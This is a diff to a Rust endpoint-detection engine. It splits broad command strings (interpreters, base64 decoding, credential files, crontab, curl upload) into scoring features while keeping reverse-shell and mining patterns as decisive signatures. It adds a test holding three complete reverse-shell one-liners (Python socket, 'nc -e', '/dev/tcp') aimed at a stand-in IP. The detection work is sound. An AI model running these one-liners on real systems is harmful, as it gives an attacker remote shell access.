@@ -195,37 +195,11 @@ fn seed_string_signatures(detection: &mut DetectionEngine) {
         "wget | bash".to_string(),
         "curl|sh".to_string(),
         "wget|sh".to_string(),
-        // Scripting interpreter execution
-        "python -c".to_string(),
-        "python3 -c".to_string(),
-        "perl -e".to_string(),
-        "ruby -e".to_string(),
-        "powershell -enc".to_string(),
-        "powershell -e ".to_string(),
         // Reverse shell patterns
         ">& /dev/tcp/".to_string(),
         "bash -i".to_string(),
         "nc -e /bin".to_string(),
         "ncat -e /bin".to_string(),
-        "mkfifo /tmp/".to_string(),
-        // Obfuscation patterns
-        "base64 -d".to_string(),
-        "base64 --decode".to_string(),
-        // Privilege escalation / credential access
-        "/etc/shadow".to_string(),
-        "/etc/sudoers".to_string(),
-        "passwd --stdin".to_string(),
-        // Kernel module loading
-        "insmod ".to_string(),
-        "modprobe ".to_string(),
-        // Persistence
-        "crontab ".to_string(),
-        "systemctl enable".to_string(),
-        // Lateral movement
-        "ssh root@".to_string(),
-        // Data exfiltration indicators
-        "curl -x post".to_string(),
-        "curl --upload".to_string(),
         // Crypto mining
         "xmrig".to_string(),
         "stratum+tcp://".to_string(),
@@ -233,16 +207,36 @@ fn seed_string_signatures(detection: &mut DetectionEngine) {
         "minerd".to_string(),
         "cpuminer".to_string(),
         "cryptonight".to_string(),
-        // Download to /tmp
+        // Anti-forensics
+        "rm -rf /var/log".to_string(),
+    ]);
+    detection.layer1.load_string_features([
+        // Ordinary interpreter, administration and transfer syntax is context only.
+        "python -c".to_string(),
+        "python3 -c".to_string(),
+        "perl -e".to_string(),
+        "ruby -e".to_string(),
+        "powershell -enc".to_string(),
+        "powershell -e ".to_string(),
+        "mkfifo /tmp/".to_string(),
+        "base64 -d".to_string(),
+        "base64 --decode".to_string(),
+        "/etc/shadow".to_string(),
+        "/etc/sudoers".to_string(),
+        "passwd --stdin".to_string(),
+        "insmod ".to_string(),
+        "modprobe ".to_string(),
+        "crontab ".to_string(),
+        "systemctl enable".to_string(),
+        "ssh root@".to_string(),
+        "curl -x post".to_string(),
+        "curl --upload".to_string(),
         "-o /tmp/".to_string(),
         "-O /tmp/".to_string(),
-        // Pipe to interpreter (with URL gap)
         "| bash".to_string(),
         "| sh".to_string(),
         "|bash".to_string(),
         "|sh".to_string(),
-        // Anti-forensics
-        "rm -rf /var/log".to_string(),
         "history -c".to_string(),
         "shred ".to_string(),
     ]);
@@ -1505,5 +1499,48 @@ rule eguard_custom_dir_test {
             .kill_chain_hits
             .iter()
             .any(|hit| hit == "killchain_reverse_shell"));
+    }
+    #[test]
+    fn detp1_broad_strings_are_features_while_reverse_shell_patterns_remain_decisions() {
+        let mut engine = detection::DetectionEngine::default_with_rules();
+        super::seed_string_signatures(&mut engine);
+        for (process, command) in [
+            ("python3", "python3 -c 'print(1)'"),
+            ("modprobe", "modprobe veth"),
+            ("base64", "base64 -d input.txt"),
+            ("python3", "python3 -c 'import os;os.dup2(1,2)'"),
+            ("systemctl", "systemctl enable normal.service"),
+        ] {
+            let mut event = base_event();
+            event.process = process.into();
+            event.parent_process = "service".into();
+            event.command_line = Some(command.into());
+            let outcome = engine.process_event(&event);
+            assert!(
+                outcome.layer1.prefilter_hit,
+                "retain scoring feature: {command}"
+            );
+            assert!(
+                outcome.layer1.matched_signatures.is_empty(),
+                "broad string is not a positive decision: {command}"
+            );
+            assert!(crate::lifecycle::AgentRuntime::detection_rule_name(&outcome).is_none());
+            assert_eq!(outcome.confidence, detection::Confidence::None);
+            assert!(!outcome
+                .ml_score
+                .as_ref()
+                .is_some_and(|score| score.positive));
+        }
+        for command in [
+            "python3 -c 'import socket,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.system(\"/bin/sh -i\")'",
+            "nc -e /bin/sh 198.51.100.7 4444",
+            "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
+        ] {
+            let mut event = base_event();
+            event.command_line = Some(command.into());
+            let outcome = engine.process_event(&event);
+            assert!(!outcome.layer1.matched_signatures.is_empty(), "specific malicious pattern stays positive");
+            assert!(crate::lifecycle::AgentRuntime::detection_rule_name(&outcome).is_some());
+        }
     }
 }
